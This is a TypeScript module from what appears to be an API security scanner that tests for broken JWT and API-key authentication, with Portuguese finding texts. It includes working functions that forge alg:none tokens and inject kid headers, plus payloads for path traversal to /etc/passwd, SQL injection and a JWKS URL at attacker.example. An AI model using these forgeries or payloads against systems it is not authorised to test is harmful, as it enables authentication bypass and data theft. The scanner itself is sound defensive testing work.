/**
 * Phase 12 TEST-02 — In-house auth-failure scanners.
 *
 * Implements 4 vectors requiring stateful credential context (per PROJECT.md
 * "BOLA/BFLA/BOPLA in-house TypeScript" decision extended to API2):
 *   1. JWT alg:none forge        → severity critical
 *   2. JWT kid injection         → severity high (4 canonical payloads)
 *   3. JWT token reuse (expired) → severity high
 *   4. API key leakage in body   → severity high (mask-at-source)
 *
 * NEVER stores full tokens or keys in evidence.extractedValues. Masks at
 * the call site: prefix of 3 chars + '***'. Phase 14 (FIND-02) reinforces
 * globally; Phase 12 is defensive-by-default.
 *
 * Zero new deps: manual JWT header/payload manipulation via
 * Buffer.from(..., 'base64url') native (Node ≥ 16).
 */
import { createLogger } from '../../../lib/logger';
import { decodeJwtExp } from '../../credentials/decodeJwtExp';
import type { ApiFindingEvidence } from '@shared/schema';
import { API_REMEDIATION_TEMPLATES } from '@shared/apiRemediationTemplates';

const log = createLogger('scanners:api:authFailure');

export interface AuthFailureHit {
  endpointId: string;
  owaspCategory: 'api2_broken_auth_2023';
  severity: 'high' | 'critical';
  title: string;
  description: string;
  remediation: string;
  evidence: ApiFindingEvidence;
}

// ---------------------------------------------------------------------------
// Vector 1: JWT alg:none forge
// ---------------------------------------------------------------------------

/**
 * Re-emit a JWT with alg=none header and empty signature.
 * Preserves the original payload verbatim — the test is whether the server
 * accepts the unsigned token, not privilege escalation.
 *
 * Returns the forged token (three-segment with trailing dot) and the
 * original alg (for evidence). Throws on opaque tokens (< 2 segments).
 */
export function forgeJwtAlgNone(
  originalJwt: string,
): { forged: string; originalAlg: string | null } {
  const parts = originalJwt.split('.');
  if (parts.length < 2) {
    throw new Error('JWT opaco — não pode forjar alg:none');
  }
  let originalAlg: string | null = null;
  try {
    const decoded = JSON.parse(Buffer.from(parts[0], 'base64url').toString('utf8'));
    originalAlg = typeof decoded?.alg === 'string' ? decoded.alg : null;
  } catch {
    originalAlg = null;
  }
  const forgedHeader = { alg: 'none', typ: 'JWT' };
  const headerB64 = Buffer.from(JSON.stringify(forgedHeader), 'utf8').toString('base64url');
  return { forged: `${headerB64}.${parts[1]}.`, originalAlg };
}

// ---------------------------------------------------------------------------
// Vector 2: JWT kid injection
// ---------------------------------------------------------------------------

export const KID_INJECTION_PAYLOADS: ReadonlyArray<{ label: string; value: string }> = [
  { label: 'path-traversal-dev-null', value: '../../../../../../../dev/null' },
  { label: 'path-traversal-etc-passwd', value: '../../../../../../../etc/passwd' },
  { label: 'sql-injection-tautology', value: "' OR '1'='1" },
  { label: 'url-injection-external-jwks', value: 'http://attacker.example/jwks.json' },
];

/**
 * Inject a kid value into the header of the JWT. Preserves payload +
 * signature unchanged. Attack vector is the parser's handling of kid,
 * not the signature itself.
 */
export function injectKid(originalJwt: string, payloadValue: string): string {
  const parts = originalJwt.split('.');
  if (parts.length < 2) {
    throw new Error('JWT opaco — não pode injetar kid');
  }
  let header: Record<string, unknown> = {};
  try {
    header = JSON.parse(Buffer.from(parts[0], 'base64url').toString('utf8'));
  } catch {
    header = {};
  }
  header.kid = payloadValue;
  const headerB64 = Buffer.from(JSON.stringify(header), 'utf8').toString('base64url');
  const signature = parts[2] ?? '';
  return `${headerB64}.${parts[1]}.${signature}`;
}

// ---------------------------------------------------------------------------
// Vector 3: Token reuse (expired JWT accepted)
// ---------------------------------------------------------------------------

export interface TokenReuseProbeResult {
  skip?: { reason: 'opaque_token' | 'not_expired' };
  hit?: AuthFailureHit;
}

/**
 * Verifies that the server rejects an expired JWT. Uses decodeJwtExp
 * (Phase 10 helper) to check exp; skips if token is opaque or still valid.
 *
 * Note: decodeJwtExp returns Date | null; null means opaque/missing/invalid.
 * We compare Date.getTime() against Date.now() to determine expiry.
 *
 * The caller is responsible for making the HTTP request with the expired
 * token; this function produces the hit shape. The probeFn parameter lets
 * tests inject a mock.
 */
export async function checkTokenReuse(
  params: {
    endpointId: string;
    endpointUrl: string;
    expiredJwt: string;
    probeFn: (jwt: string) => Promise<{ status: number; bodySnippet?: string }>;
  },
): Promise<TokenReuseProbeResult> {
  const expDate = decodeJwtExp(params.expiredJwt);
  if (expDate === null) {
    return { skip: { reason: 'opaque_token' } };
  }
  const nowMs = Date.now();
  if (expDate.getTime() > nowMs) {
    return { skip: { reason: 'not_expired' } };
  }
  const probe = await params.probeFn(params.expiredJwt);
  if (probe.status >= 400) {
    return {}; // server correctly rejected — no finding
  }
  const tokenExpiredAt = expDate.toISOString();
  const acceptedAt = new Date().toISOString();

  const hit: AuthFailureHit = {
    endpointId: params.endpointId,
    owaspCategory: 'api2_broken_auth_2023',
    severity: 'high',
    title: 'JWT expirado aceito pelo servidor',
    description: 'O servidor aceitou um JWT cuja claim `exp` já passou. Tokens expirados devem ser rejeitados imediatamente.',
    remediation: API_REMEDIATION_TEMPLATES.api2_broken_auth_2023.token_reuse,
    evidence: {
      request: { method: 'GET', url: params.endpointUrl, bodySnippet: undefined },
      response: { status: probe.status, bodySnippet: probe.bodySnippet?.slice(0, 8192) },
      extractedValues: { tokenExpiredAt, acceptedAt },
      context: 'Token reuse test — expired JWT accepted',
    },
  };
  log.warn({ endpointId: params.endpointId }, 'checkTokenReuse: expired JWT accepted by server');
  return { hit };
}

// ---------------------------------------------------------------------------
// Vector 4: API key leakage in response body
// ---------------------------------------------------------------------------

export interface LeakageProbeEntry {
  endpointId: string;
  endpointUrl: string;
  responseBody: string;
}

/**
 * Mask an API key for evidence emission. Returns prefix of first 3 chars
 * followed by '***'. NEVER emit the full key into logs or evidence.
 */
export function maskApiKey(key: string): string {
  if (!key || key.length === 0) return '***';
  const prefix = key.slice(0, 3);
  return `${prefix}***`;
}

/**
 * Scans a batch of response bodies for presence of the API key string.
 * Returns at most one finding (first match); subsequent matches are logged
 * but not returned (reduces noise — one leakage proves broken auth API2).
 */
export function detectApiKeyLeakage(
  apiKey: string,
  probes: LeakageProbeEntry[],
): AuthFailureHit | null {
  if (!apiKey || apiKey.length < 4) return null;
  const match = probes.find((p) => typeof p.responseBody === 'string' && p.responseBody.includes(apiKey));
  if (!match) return null;

  const leakedKeyPrefix = maskApiKey(apiKey);
  const bodySnippet = match.responseBody.slice(0, 8192);

  return {
    endpointId: match.endpointId,
    owaspCategory: 'api2_broken_auth_2023',
    severity: 'high',
    title: 'API key vazada em response body',
    description: `A string da API key aparece no corpo da resposta de um endpoint. Exposição direta em resposta HTTP.`,
    remediation: API_REMEDIATION_TEMPLATES.api2_broken_auth_2023.api_key_leakage,
    evidence: {
      request: { method: 'GET', url: match.endpointUrl },
      response: { status: 200, bodySnippet },
      extractedValues: {
        leakedKeyPrefix,
        leakedInEndpointId: match.endpointId,
      },
      context: 'API key substring match in response body — mask-at-source applied',
    },
  };
}

// ---------------------------------------------------------------------------
// Vector 1 + 2 common: build finding from alg:none / kid probe result
// ---------------------------------------------------------------------------

export function buildAlgNoneHit(params: {
  endpointId: string;
  endpointUrl: string;
  originalAlg: string | null;
  responseStatus: number;
  responseBodySnippet?: string;
}): AuthFailureHit {
  return {
    endpointId: params.endpointId,
    owaspCategory: 'api2_broken_auth_2023',
    severity: 'critical',
    title: 'JWT com alg=none aceito pelo servidor',
    description: 'O servidor aceitou um JWT forjado com alg=none e assinatura vazia. Bypass completo de autenticação.',
    remediation: API_REMEDIATION_TEMPLATES.api2_broken_auth_2023.alg_none,
    evidence: {
      request: { method: 'GET', url: params.endpointUrl },
      response: { status: params.responseStatus, bodySnippet: params.responseBodySnippet?.slice(0, 8192) },
      extractedValues: { jwtAlg: 'none', originalAlg: params.originalAlg ?? 'unknown' },
      context: 'alg:none forge test — critical auth bypass',
    },
  };
}

export function buildKidInjectionHit(params: {
  endpointId: string;
  endpointUrl: string;
  payloadLabel: string;
  originalKid: string | null;
  responseStatus: number;
  responseBodySnippet?: string;
}): AuthFailureHit {
  return {
    endpointId: params.endpointId,
    owaspCategory: 'api2_broken_auth_2023',
    severity: 'high',
    title: `kid injection aceito pelo servidor (${params.payloadLabel})`,
    description: 'O servidor aceitou um JWT com kid header manipulado. Possível path traversal, SQLi, ou SSRF via JWKS externo.',
    remediation: API_REMEDIATION_TEMPLATES.api2_broken_auth_2023.kid_injection,
    evidence: {
      request: { method: 'GET', url: params.endpointUrl },
      response: { status: params.responseStatus, bodySnippet: params.responseBodySnippet?.slice(0, 8192) },
      extractedValues: {
        kidPayloadLabel: params.payloadLabel,
        originalKidMasked: params.originalKid ? `${params.originalKid.slice(0, 3)}***` : null,
      },
      context: 'kid injection test — parser misuse of kid header',
    },
  };
}
